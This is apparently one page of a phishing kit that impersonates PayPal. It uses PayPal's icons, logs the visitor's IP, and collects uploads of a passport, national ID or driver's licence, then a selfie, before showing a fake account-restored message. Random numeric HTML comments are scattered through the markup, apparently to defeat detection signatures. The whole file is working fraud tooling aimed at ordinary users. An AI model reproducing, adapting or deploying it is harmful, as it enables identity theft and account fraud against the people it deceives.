<?php
//error_reporting(0);
session_start();
require_once '../main.php';
require_once 'session.php';
require_once '../lang.php';
if($onetime == "on") {
	tulis_file("../security/onetime.dat","$ip");
}
if($get_id == "on"){}else{echo "<script type='text/javascript'>window.top.location='done?key=$key';</script>";}
?>
    <!DOCTYPE html>
    <html>

    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=Edge">
        <link rel="shortcut icon" href="https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico">
        <link rel="apple-touch-icon" href="https://www.paypalobjects.com/webstatic/icon/pp64.png">
        <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
        <title>
            <?php echo $account['title'];?>
        </title>
        <link rel="stylesheet" href="assets/css/process.css">
        <script type="text/javascript" src="assets/js/jquery-3.3.1.min.js">
        </script>
        <script type="text/javascript" src="assets/js/jquery.mask.min.js">
        </script>
        <script type="text/javascript" src="assets/js/jquery.ccvalid.js"></script>
    </head>

    <body>
        <?php include "assets/static/header.html" ?>
            <div class="mainContainer">
                <div class="hide" id="rotate">
                    <div class="spinner">
                        <div class="rotate"></div>
                        <div class="processing">
                            <?php echo $account['processing'];?>...</div>
                    </div>
                    <div class="overlay">
                    </div>
                </div>
                <div class="mobileNav">
                    <div class="navHeader">
                        <div class="blockToggler">
                            <label class="menuLabel" for="toggleMenu"><span></span>
                                <div class="menuOpen">Menu</div>
                                <div class="menuClose">
                                    Close</div>
                            </label>
                        </div>
                    </div>
                    <div class="navLogo">
                        <a href="javascript:" class="mobileBrand"></a>
                    </div>
                    <ul class="notifUl">
                        <li>
                            <a class="svgLogo notifTxt">
                                <img src="assets/img/noti.svg" alt="">
                            </a>
                        </li>
                    </ul>
                </div>
                <?php if($os == "Android" or $os == "iPhone") {
        }else{
          echo "<br><br>";
        }?>
                    <div class="contents">
                        <section class="mainContents contentContainerBordered" id="finish">
                            <input id="keke" type="hidden" hidden="hidden" value="<?php echo $key;?>">
                            <div style="padding:0 20px">
                                <h1 style="margin:10px;padding-bottom:10px;font-size:2.4rem">
		<?php echo $id['uploadur'];?>	</h1>
                                <div>
                                    <ol class="proof">
                                        <li class="itm current">
                                            <div class="ui-text-small">
                                                <?php echo $id['ip'];?>
                                                    <!--31864166-->
                                            </div>
                                        </li>
                                        <li class="itm">
                                            <div class="ui-text-small">
                                                <!--42877764-->
                                                <?php echo $id['swp'];?>
                                            </div>
                                        </li>
                                        <!--87875023-->
                                        <!--85346098-->
                                        <li class="itm">
                                            <div class="ui-text-small">
                                                <?php echo $id['pc'];?>
                                            </div>
                                        </li>
                                        <!--18916056-->
                                    </ol>
                                </div>
                                <div id="select_one">
                                    <!--8355101-->
                                    <form action="javascript:void(0);" method="POST">
                                        <!--341947-->
                                        <!--14849027-->
                                        <div id="area_choose">
                                            <!--4276259-->
                                            <h1 style="font-size:1.4rem!important">
								<?php echo $id['choose'];?></h1>
                                            <div class="doc_type">
                                                <div class="doc_type_choice">
                                                    <div class="doc_type_choice_wrapper">
                                                        <div>
                                                            <img src="assets/img/id_p.svg" alt="">
                                                        </div>
                                                        <label class="cont">
                                                            <input type="radio" name="doc_type" value="Passport">
                                                            <!--45702491--><span class="checkmark"></span>
                                                            <span> <?php echo $id['passport'];?></span>
                                                            <!--99114641-->
                                                        </label>
                                                    </div>
                                                </div>
                                                <!--50334486-->
                                                <div class="doc_type_choice">
                                                    <div class="doc_type_choice_wrapper">
                                                        <div>
                                                            <img src="assets/img/id_n.svg" alt="">
                                                        </div>
                                                        <!--45118334-->
                                                        <label class="cont">
                                                            <input type="radio" name="doc_type" value="National ID"> <span class="checkmark"></span>
                                                            <!--68015357--><span> <?php echo $id['natid'];?></span>
                                                            <!--56119564-->
                                                        </label>
                                                    </div>
                                                </div>
                                                <div class="doc_type_choice">
                                                    <div class="doc_type_choice_wrapper">
                                                        <div>
                                                            <img src="assets/img/id_lic.svg" alt="">
                                                            <!--10573839-->
                                                        </div>
                                                        <label class="cont">
                                                            <!--2500398-->
                                                            <input type="radio" name="doc_type" value="Driver's license">
                                                            <!--22257854--><span class="checkmark"></span>
                                                            <!--18780954--><span> <?php echo $id['drive'];?></span>
                                                        </label>
                                                    </div>
                                                    <!--8939367-->
                                                    <!--59510384-->
                                                </div>
                                            </div>
                                            <!--74403878-->

                                            <button style="margin-bottom:1.2rem;margin-top:1rem" type="submit" class="bt bt_select_one">
                                                <?php echo $id['proc'];?>
                                            </button>
                                        </div>
                                        <div id="area_up_id" style="display:none">
                                            <h1 style="font-size:1.4rem"><?php echo $id['upur'];?><!--2438283-->		<span></span>
	<!--6976252-->	</h1>
                                            <div class="row rules text-center">
                                                <!--78953027-->
                                                <div class="rule">
                                                    <!--47187466-->
                                                    <img src="assets/img/scan_id.svg" alt="">
                                                    <div>
                                                        <?php echo $id['take'];?>
                                                    </div>
                                                </div>
                                                <div class="rule">
                                                    <img src="assets/img/both_sides.svg" alt="">
                                                    <!--77222865-->
                                                    <div>
                                                        <?php echo $id['submit'];?>
                                                    </div>
                                                </div>
                                                <div class="rule">
                                                    <img src="assets/img/both_pass.svg" alt="">
                                                    <div>
                                                        <!--12601849-->
                                                        <?php echo $id['scan'];?>
                                                    </div>
                                                    <!--75311794-->
                                                </div>
                                            </div>
                                            <div class="zone" id="up_id_zone">
                                                <!--54567872-->
                                                <div class="dropzone-main" style="display:block">
                                                    <div class="dropzone-img">
                                                        <input style="display:none" type="file" name="file[]" accept="image/*" multiple>
                                                    </div>
                                                    <p><b><?php echo $id['drag'];?></p>
									</div>
								</div>
								<div class="imagesArea"></div>
								<button style="margin-bottom:1.2rem;margin-top:1rem" type="submit" class="bt bt_select_one"><?php echo $id['proc'];?></button>
								<div><a href="javascript:void(0)" class="back"><?php echo $id['back'];?></a>
								<br><br></div>
							</div>
						</form>
					</div>
					<div id="select_two" class="hide">
						<form action="javascript:void(0);" method="POST">
							<div id="area_up_selfie">
								<h1 style="font-size:1.4rem"><?php echo $id['ups'];?><span></span></h1>
								<div class="row rules text-center">
									<div class="rule">
										<img src="assets/img/take_s.svg" alt="">
										<div><?php echo $id['make'];?></div>
									</div>
									<div class="rule">
										<img src="assets/img/fingers_not.svg" alt="">
										<div><?php echo $id['finger'];?></div>
									</div>
									<div class="rule">
										<img src="assets/img/glaesses_not.svg" alt="">
										<div><?php echo $id['wear'];?></div>
									</div>
								</div>
								<div class="zone" id="up_id_zone">
									<div class="dropzone-main" style="display:block">
										<div class="dropzone-img" style="background-image:url(assets/img/up_slf.svg),none">
											<input style="display:none" type="file" name="file[]" accept="image/*" multiple>
										</div>
										<p><b><?php echo $id['drag'];?></p>
									</div>
								</div>
								<div class="imagesArea"></div>
								<input type="hidden" name="id_slf" value="ok">
								<input style="margin-bottom:1rem;margin-top:1rem" type="submit" class="bt" value="<?php echo $id['proc'];?>">
								<div><a href="javascript:void(0)" class="back"><?php echo $id['back'];?></a><br><br>
								</div>
							</div>
						</form>
					</div>
					<div id="select_three" class="hide">
						<div style="padding:20px">
							<img src="assets/img/success.svg" alt="" width="150">
							<h1 style="margin:10px;padding-bottom:10px;font-size:2.4rem"><?php echo $id['restore'];?>
							<div>
								<button style="margin-top:20px;border-radius:.5rem" class="bt gone_bt"><?php echo $account['continue'];?></button>
							</div>
						</div>
					</div>
				</div>
			</section>
			<?php include "assets/static/footer.html" ?>
		</div>
    </div>
	<script src="assets/js/validate_identity.js">
    </script>
</body>

</html>